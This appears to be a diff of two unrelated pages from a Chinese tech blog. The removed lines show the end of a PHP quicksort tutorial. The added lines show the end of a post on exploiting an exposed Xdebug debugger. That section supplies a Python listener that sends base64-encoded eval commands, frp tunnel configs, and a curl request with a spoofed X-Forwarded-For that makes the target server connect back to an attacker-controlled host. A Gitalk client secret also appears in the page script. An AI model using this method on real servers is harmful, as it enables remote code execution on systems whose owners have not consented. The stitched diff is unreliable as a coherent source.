-<span style=color:#8b008b;font-weight:700>function</span> <span style=color:#008b45>quickSort</span>(&amp;<span style=color:#00688b>$arr</span>, <span style=color:#00688b>$start</span>, <span style=color:#00688b>$end</span>) {
-    <span style=color:#00688b>$i</span> = <span style=color:#00688b>$start</span>;
-    <span style=color:#00688b>$j</span> = <span style=color:#00688b>$end</span>;
-    <span style=color:#00688b>$pivot</span> = <span style=color:#00688b>$arr</span>[<span style=color:#00688b>$start</span>];
-    <span style=color:#8b008b;font-weight:700>while</span> (<span style=color:#00688b>$j</span> &gt; <span style=color:#00688b>$i</span>) {
-        <span style=color:#228b22>// 右边有比选点小的, 扔到左边, 让下一while得以继续
-</span><span style=color:#228b22></span>        <span style=color:#8b008b;font-weight:700>while</span> (<span style=color:#00688b>$arr</span>[<span style=color:#00688b>$j</span>] &gt;= <span style=color:#00688b>$pivot</span> &amp;&amp; <span style=color:#00688b>$j</span> &gt; <span style=color:#00688b>$i</span>) {
-            <span style=color:#00688b>$j</span>--;
-        }
-        <span style=color:#8b008b;font-weight:700>if</span> (<span style=color:#00688b>$arr</span>[<span style=color:#00688b>$j</span>] &lt;= <span style=color:#00688b>$pivot</span>) {
-            <span style=color:#00688b>$temp</span> = <span style=color:#00688b>$arr</span>[<span style=color:#00688b>$j</span>];
-            <span style=color:#00688b>$arr</span>[<span style=color:#00688b>$j</span>] = <span style=color:#00688b>$arr</span>[<span style=color:#00688b>$i</span>];
-            <span style=color:#00688b>$arr</span>[<span style=color:#00688b>$i</span>] = <span style=color:#00688b>$temp</span>;
-        }
-        <span style=color:#228b22>// 左边的有比选点大的就,扔到右边, 让上一while得以继续
-</span><span style=color:#228b22></span>        <span style=color:#8b008b;font-weight:700>while</span> (<span style=color:#00688b>$arr</span>[<span style=color:#00688b>$i</span>] &lt;= <span style=color:#00688b>$pivot</span> &amp;&amp; <span style=color:#00688b>$j</span> &gt; <span style=color:#00688b>$i</span>) {
-            <span style=color:#00688b>$i</span>++;
-        }
-        <span style=color:#8b008b;font-weight:700>if</span> (<span style=color:#00688b>$arr</span>[<span style=color:#00688b>$i</span>] &gt;= <span style=color:#00688b>$pivot</span>) {
-            <span style=color:#00688b>$temp</span> = <span style=color:#00688b>$arr</span>[<span style=color:#00688b>$i</span>];
-            <span style=color:#00688b>$arr</span>[<span style=color:#00688b>$i</span>] = <span style=color:#00688b>$arr</span>[<span style=color:#00688b>$j</span>];
-            <span style=color:#00688b>$arr</span>[<span style=color:#00688b>$j</span>] = <span style=color:#00688b>$temp</span>;
-        }
-    }
-    <span style=color:#228b22>// 循环结束后，i,j都指向选点
-</span><span style=color:#228b22></span>    <span style=color:#8b008b;font-weight:700>if</span> (<span style=color:#00688b>$i</span> &gt; <span style=color:#00688b>$start</span>) {
-        quickSort(<span style=color:#00688b>$arr</span>, <span style=color:#00688b>$start</span>, <span style=color:#00688b>$i</span> - <span style=color:#b452cd>1</span>);
-    }
-    <span style=color:#8b008b;font-weight:700>if</span> (<span style=color:#00688b>$j</span> &lt; <span style=color:#00688b>$end</span>) {
-        quickSort(<span style=color:#00688b>$arr</span>, <span style=color:#00688b>$j</span> + <span style=color:#b452cd>1</span>, <span style=color:#00688b>$end</span>);
-    }
-}
+<h3 id=方式二-利用脚本文件-实现当-xdebug-与-client-建立连接后-client-交互式的发送指令给目标机器>方式二: 利用脚本文件, 实现当 xdebug 与 client 建立连接后, client 交互式的发送指令给目标机器</h3>
+<p>xdebug.py</p>
+<pre tabindex=0><code>#!/usr/bin/python3
+import socket
+import base64
 
-<span style=color:#00688b>$arr</span> = [<span style=color:#b452cd>38</span>, <span style=color:#b452cd>19</span>, <span style=color:#b452cd>29</span>, <span style=color:#b452cd>91</span>, <span style=color:#b452cd>85</span>, <span style=color:#b452cd>12</span>, <span style=color:#b452cd>41</span>, <span style=color:#b452cd>21</span>];
-quickSort(<span style=color:#00688b>$arr</span>, <span style=color:#b452cd>0</span>, count(<span style=color:#00688b>$arr</span>) - <span style=color:#b452cd>1</span>);
-print_r(<span style=color:#00688b>$arr</span>);
-</code></pre></div><h2 id=5-效率分析>5 效率分析</h2>
-<p>1、时间复杂度：O(nlogn)
-最好的情况：当分区选取的基准元素为待排序元素中的"中值"，时间复杂度为O(nlogn);
-最坏的情况：当分区选取的基准元素为待排序元素中的最大或最小值，时间复杂度为O(n²)。
-2、空间复杂度：O(log2n)，是不稳定排序。</p>
+ip_port = ('0.0.0.0',9000)
+sk = socket.socket()
+sk.bind(ip_port)
+sk.listen(10)
+conn, addr = sk.accept()
+
+while True:
+    client_data = conn.recv(1024)
+    print(&quot;&lt;&lt;\n&quot;)
+    print(client_data)
+    print(&quot;\n&quot;)
+
+    data = input('&gt;&gt; ')
+    data = base64.b64encode(data.encode('utf-8'))
+    print('eval -i 1 -- %s\x00' % data.decode('utf-8'))
+    conn.sendall(('eval -i 1 -- %s\x00' % data.decode('utf-8')).encode('utf-8'))
+</code></pre><h3 id=利用-gofrp6-实现将本机作为-xdebug-client-方便调试>利用 <strong><a href=https://github.com/fatedier/frp>gofrp</a></strong> 实现将本机作为 <strong>xdebug client</strong>, 方便调试</h3>
+<p>frps.ini</p>
+<div class=highlight><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ini data-lang=ini><span style=color:#228b22>; frps.ini</span>
+<span style=color:#8b008b;font-weight:700>[common]</span>
+<span style=color:#658b00>bind_port</span> = <span style=color:#cd5555>7000</span>
+<span style=color:#658b00>kcp_bind_port</span> = <span style=color:#cd5555>7000</span>
+<span style=color:#658b00>token</span> = <span style=color:#cd5555>whatthefuck</span>
+</code></pre></div><p>fprc.ini</p>
+<div class=highlight><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ini data-lang=ini><span style=color:#228b22>; frpc.ini</span>
+<span style=color:#8b008b;font-weight:700>[common]</span>
+<span style=color:#658b00>server_addr</span> = <span style=color:#cd5555>xxx.xxx.xxx.xxx</span>
+<span style=color:#658b00>server_port</span> = <span style=color:#cd5555>7000</span>
+<span style=color:#658b00>token</span> = <span style=color:#cd5555>whatthefuck</span>
+
+<span style=color:#8b008b;font-weight:700>[tcp_9000]</span>
+<span style=color:#658b00>type</span> = <span style=color:#cd5555>tcp</span>
+<span style=color:#658b00>local_port</span> = <span style=color:#cd5555>9000</span>
+
+<span style=color:#8b008b;font-weight:700>[tcp_9003]</span>
+<span style=color:#658b00>type</span> = <span style=color:#cd5555>tcp</span>
+<span style=color:#658b00>local_port</span> = <span style=color:#cd5555>9003</span>
+</code></pre></div><p><strong>运行命令启动 client</strong></p>
+<pre tabindex=0><code>python3 xdebug.py
+frpc -c ./frpc.ini
+</code></pre><p>接着即可用 <strong>CURL</strong> 嗅探指令来建立 xdebug 连接, 注意 <code>X-Forwarded-For</code> 应当指定为 <strong>frps</strong> 服务器地址</p>
+<div class=highlight><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>curl -v <span style=color:#cd5555>&#34;http://</span><span style=color:#cd5555>${</span><span style=color:#00688b>TARGET_HOST</span><span style=color:#cd5555>}</span><span style=color:#cd5555>/?XDEBUG_SESSION_START=phpstrom&#34;</span> <span style=color:#cd5555>\
+</span><span style=color:#cd5555></span>    -H <span style=color:#cd5555>&#34;X-Forwarded-For: </span><span style=color:#cd5555>${</span><span style=color:#00688b>FRPS_HOST</span><span style=color:#cd5555>}</span><span style=color:#cd5555>&#34;</span> -H <span style=color:#cd5555>&#34;Cookie: XDEBUG_SESSION=start&#34;</span>
+</code></pre></div>
 <br>
 <div id=gitalk-container></div>
 <link rel=stylesheet href=https://unpkg.com/gitalk/dist/gitalk.css>
 <script src=https://unpkg.com/gitalk/dist/gitalk.min.js></script>
-<script>const gitalk=new Gitalk({clientID:"6013bee34640a2d2ca59",clientSecret:"5312844fb251dfc7aaaad370b3182f17af42da0c",repo:"codiy1992.github.io",owner:"codiy1992",admin:["codiy1992"],id:"docs-2020-04-04-%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%",distractionFreeMode:!1});gitalk.render("gitalk-container")</script>
-<div class="text-muted mt-5 pt-3 border-top">
-Last modified January 5, 2022: <a href=https://github.com/codiy1992/notebook/commit/efcef740fd95e6acdc0aeca0893dae1995abb23c>Docsy Theme (efcef74)</a>
-</div>
+<script>const gitalk=new Gitalk({clientID:"6013bee34640a2d2ca59",clientSecret:"5312844fb251dfc7aaaad370b3182f17af42da0c",repo:"codiy1992.github.io",owner:"codiy1992",admin:["codiy1992"],id:"docs-2022-01-php-xdebug",distractionFreeMode:!1});gitalk.render("gitalk-container")</script>
 </div>
 </main>
 </div>
